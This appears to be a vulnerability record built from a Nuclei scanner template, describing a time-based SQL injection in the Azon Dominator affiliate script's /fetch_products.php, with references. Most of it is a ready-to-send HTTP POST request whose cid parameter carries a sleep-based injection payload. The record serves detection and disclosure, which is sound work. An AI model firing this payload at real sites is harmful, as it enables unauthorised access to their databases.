# Nuclei Template: Azon Dominator - SQL Injection
**Template ID:** azon-dominator-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`azon-dominator-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Azon Dominator software is vulnerable to a sql attack at /fetch_products.php.

## Steps to reproduce / Exploit Payload
```http
@timeout 20s
POST /fetch_products.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

cid=1*if(now()=sysdate()%2Csleep(6)%2C0)&max_price=124&minimum_range=0&sort=112
```

## References
- https://www.exploit-db.com/exploits/52059
- https://www.codester.com/items/12775/azon-dominator-affiliate-marketing-script
